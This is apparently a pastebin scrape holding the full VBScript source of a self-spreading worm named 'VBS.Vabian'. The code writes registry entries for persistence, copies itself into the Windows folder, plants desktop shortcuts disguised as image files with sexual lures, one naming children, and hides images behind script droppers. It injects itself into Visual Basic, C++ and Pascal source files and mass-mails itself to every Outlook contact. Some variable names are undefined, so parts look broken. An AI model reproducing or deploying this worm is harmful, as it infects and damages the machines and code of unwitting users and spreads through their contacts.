<xml><title>ww_1508510729680</title><id>/in9HWUm1<author>xAmPasteBin</author><date>Oct 20th, 2017 09:45:27 AM UTC-5</date><content>Rem VBS.W32.I-worm.Vabian
Rem Script Project Infector [pas,frm,cpp]
Rem By Psychologic aka Puppy
Rem Mailto : Psychologic@hotmail.com

On error resume next
Set executor = wscript.CreateObject("WScript.Shell")
Set fso = CreateObject("scripting.FileSystemObject")
Set drop = Fso.opentextfile(wscript.scriptfullname, 1)
src = drop.readall
drop.close

executor.regwrite "HKEY_CLASSES_ROOT\VXFile\"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\DefaultIcon\","C:\PROGRA~1\INTERN~1\iexplore.exe,8"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ScriptEngine\","VBScript"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\Shell\Open\Command\","C:\WINDOWS\WScript.exe " &amp; chr(34) &amp; "%1" &amp; chr(34) &amp; " %*"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\Shell\Play\Command\","C:\WINDOWS\COMMAND\CScript.exe " &amp; chr(34) &amp; "%1" &amp; chr(34) &amp; " %*"
executor.regwrite "HKEY_CLASSES_ROOT\VXFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
executor.regwrite "HKEY_CLASSES_ROOT\.VX\","VXFile"
executor.regwrite "HKEY_CLASSES_ROOT\VX\CLSID\","{B54F3741-5B07-11cf-A4B0-00AA004A55E8}"
executor.regwrite "HKEY_CLASSES_ROOT\VX\OLEScript\"

fso.copyfile wscript.scriptfullname,"C:\windows\backup_vabian.sys"
fso.copyfile wscript.scriptfullname,"C:\windows\Vabian.VX"

if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Sex-Vabian.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\Vabian.VX")
	msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
	msc.WindowStyle = 4
	msc.Save
end if

if fso.FolderExists("C:\windows\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\windows\Desktop\Sex-Children.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\Vabian.VX")
	msc.WindowStyle = 4
	msc.Save
end if

set opendroperfrm = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcefrm = ""
oneline = ""
do while opendroperfrm.readline &lt;&gt; "'VabianMarker"
  oneline = opendroperfrm.readline
  frmformat = replace(oneline,chr(34),chr(34)&amp;"&amp;chr(34)&amp;"&amp;chr(34))
  fullline = "? #1," &amp; frmformat
  allsourcefrm = allsourcefrm &amp; vbcrlf &amp; fullline
loop
opendroperfrm.close

set opendropercpp = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcecpp = ""
oneline1 = ""
do while opendropercpp.readline &lt;&gt; "'VabianMarker"
	oneline1 = ""
	oneline1 = opendropercpp.readline
	onebyone = len(oneline1)
	for i = 1 to onebyone
		read34 = mid(oneline1,i,1)
		if read34 = chr(34) then
			m = ",34"
		else
		m = ""
		end if
		all = all &amp; m
	next
	cppformat1 = replace(oneline1,chr(34),"%c")
	cppformat = replace(cppformat1,"\","\\")
	fullline1 = "fprintf(mvbswe," &amp; chr(34) &amp; cppformat &amp; "\n" &amp; chr(34) &amp; all &amp; ");"
	allsourcecpp = allsourcecpp &amp; vbcrlf &amp;  fullline1
	all = ""
	loop
opendropercpp.close

set opendroperpas = fso.OpenTextFile("C:\windows\backup_vabian.sys", 1)
allsourcepas = ""
oneline2 = ""
do while opendroperpas.readline &lt;&gt; "'VabianMarker"
	oneline2 = ""
	oneline2 = opendroperpas.readline
	fullline2 = "writeln (mvbswe,'" &amp; oneline2 &amp; "');"
	allsourcepas = allsourcepas &amp; vbcrlf &amp; fullline2
	loop
opendroperpas.close


winfold = fso.getspecialfolder(0)
backpath = winfold &amp; "\vabian.vbs"
executor.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vabian", "wscript.exe " &amp; backpath &amp; " %"
fso.copyfile wscript.scriptfullname, backpath
ranpay = int(rnd * 9)+1

if ranpay &gt; 5 then
	set payload = fso.CreateTextFile("C:\payload.txt")
	payload.write "VBS.Vabian" &amp; vbcrlf &amp; "-------------" &amp; vbcrlf
	payload.write "Dear user ... " &amp; vbcrlf &amp; "I just want to tell you something" &amp; vbcrlf
	payload.write "Your computer has been infected with virus,it called VBS.Vabian" &amp; vbcrlf
	payload.write "If you are an Programer, go look at your project check all your frm or cpp or pas files" &amp; vbcrlf
	payload.write "Cos that is the victim" &amp; vbcrlf &amp; "Ok I have to go now" &amp; vbcrlf 
	payload.write "--------------------------------------------------" &amp; vbcrlf
	payload.write "Made by Psychologic aka Puppy - Indonesian hip-hop singer"
	payload.close
	executor.run "C:\payload.txt"
end if

Set Drives=fso.drives 

For Each Drive in Drives
	If drive.isready then
		FindVictim drive
	end If 
Next

function FindVictim(path)
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files

	If fso.GetExtensionName(file.path)="frm" then
	on error resume next
	set readfrmmarker = fso.OpenTextFile(file.path,1, True)
	frmmarker = readfrmmarker.readline
	frmreadall = readfrmmarker.readall
		if frmmarker &lt;&gt; "Rem W32.hllp.Vabian" then
			set readfrmmarker = fso.CreateTextFile(file.path, True)
			readfrmmarker.write "Rem W32.hllp.Vabian" &amp; vbcrlf &amp; frmreadall &amp; vbcrlf
			readfrmmarker.write "Private Sub form_unload(cancel As Integer)" &amp; vbcrlf
			readfrmmarker.write "On Error GoTo err:" &amp; vbcrlf 
			readfrmmarker.write "Open " &amp; chr(34) &amp; "C:\vabian.vbs" &amp; chr(34) &amp; " for output as #1" &amp; vbcrlf
			readfrmmarker.write allsourcefrm &amp; vbcrlf &amp; "close #1" &amp; vbcrlf &amp; "shell " &amp; chr(34) &amp; "C:\vabian.vbs" &amp; chr(34) &amp; vbcrlf
			readfrmmarker.write "msgbox " &amp; chr(34) &amp; "Your Program has been infected by Vabian virus Created by Psychologic" &amp; chr(34) &amp; ",VbInformation," &amp; chr(34) &amp; "W32.VBS.Vabian" &amp; chr(34)
			readfrmmarker.write vbcrlf &amp; "exit sub" &amp; vbcrlf &amp; "err:" &amp; vbcrlf &amp; "End sub" &amp; vbcrlf
			readfrmmarker.close
		end if
	end if


	If fso.GetExtensionName(file.path)="cpp" then
	on error resume next
	set readcppmarker = fso.OpenTextFile(file.path,1, True)
	cppmarker = readcppmarker.readline
	cppreadall = readcppmarker.readall
		if mid(cppreadall,len(cppreadall),1) = "}" then
			cppreadall1 = replace(cppreadall,mid(cppreadall,len(cppreadall),1),"")
		end if

		if cppmarker &lt;&gt; "// W32.hllp.Vabian" then
			set readcppmarker = fso.CreateTextFile(file.path, True)
			readcppmarker.write "// W32.hllp.Vabian" &amp; vbcrlf &amp; "FILE *Vabian;" &amp; vbcrlf
			readcppmarker.write cppreadall &amp; "wormvabian = fopen("&amp;chr(34)&amp;"vabian.vbs"&amp;chr(34)&amp;","&amp;chr(34)&amp;"wt"&amp;chr(34)&amp;");" &amp; vbcrlf
			readcppmarker.write "if(wormvabian)"&amp;vbcrlf&amp;"{"&amp; allsourcecpp &amp;vbcrlf&amp;"}" &amp; vbcrlf
			readcppmarker.write "ShellExecute(NULL, "&amp;chr(34)&amp;"open"&amp;chr(34)&amp;", "&amp;chr(34)&amp;"vabian.vbs"&amp;chr(34)&amp;", NULL, NULL, SW_SHOWNORMAL);" &amp; vbcrlf
			readcppmarker.write "}" &amp; vbcrlf
			readcppmarker.close
		end if
	end if


	If fso.GetExtensionName(file.path)="pas" then
	on error resume next
	set readpasmarker = fso.OpenTextFile(file.path,1, True)
	pasmarker = readpasmarker.readline
	pasreadall = readpasmarker.readall
		if pasmarker &lt;&gt; "{ W32.hllp.Vabian }" then
			set readpasmarker = fso.CreateTextFile(file.path, True)
			readpasmarker.write "{ W32.hllp.Vabian }" &amp; vbcrlf &amp; pasreadall &amp; vbcrlf
			readpasmarker.write "procedure " &amp; "TForm1.FormClose(Sender: TObject; var Action: TCloseAction);" &amp; vbcrlf
			readpasmarker.write "begin" &amp; vbcrlf &amp; "AssignFile (Vabian,'C:\Windows\STARTM~1\programs\startup\Vabian.vbs');" &amp; vbcrlf
			readpasmarker.write "Rewrite (Vabian);" &amp; vbcrlf &amp; allsourcepas &amp; vbcrlf &amp; "CloseFile(Vabian);" &amp; vbcrlf
			readpasmarker.close
		end if
	end if

	If fso.GetExtensionName(file.path)="bmp" or fso.GetExtensionName(file.path)="jpg" or fso.GetExtensionName(file.path)="gif" or fso.GetExtensionName(file.path)="ico" then 
		For i = 1 To 8
			fvar = Chr(Int(22 * Rnd) + 97)
			varall = fvar &amp; varall
		Next
		on error resume next
		bathelp = file.path &amp; ".bat"
		Set dropper = Fso.Createtextfile(bathelp, True)
		dropper.writeline "Attrib +h " &amp; file.path
		dropper.Close
		executor.run bathelp
		fso.Deletefile bathelp
		vbscopy = file.path &amp; ".VX"
		Set dropper2 = Fso.Createtextfile(vbscopy, True)
		dropper2.write "Set " &amp; varall &amp; " = wscript.CreateObject(" &amp; chr(34) &amp; "WScript.Shell" &amp; chr(34) &amp; ")" &amp; vbcrlf &amp; "Sucke.run " &amp; chr(34) &amp; file.path &amp; chr(34) &amp; vbcrlf
		dropper2.write scr
		dropper2.Close
	end if

next

Set Subfolders = folder.SubFolders
	For Each Subfolder in Subfolders
		FindVictim Subfolder.path 
	Next 
end function 

Set spreader =CreateObject("Outlook.Application")
Set spreader =spreader.GetNameSpace("MAPI")
For Each C In spreader.AddressLists
If C.AddressEntries.Count &lt;&gt; 0 Then
For D=1 To C.AddressEntries.Count
Set spreader=C.AddressEntries(D)
Set spreader=spreader.CreateItem(0)
spreader.To=aaaaaaaa.Address
spreader.Subject="Vabian Milenium"
spreader.Body="Stop asking,just checkout the attachment"
spreader.Attachments.Add(Fso.GetSpecialFolder(0)&amp;"\Vabian.vbs")
spreader.DeleteAfterSubmit=True
If spreader.To &lt;&gt; "" Then
spreader.Send
End If
Next
End If
Next

'VabianMarker</content></xml>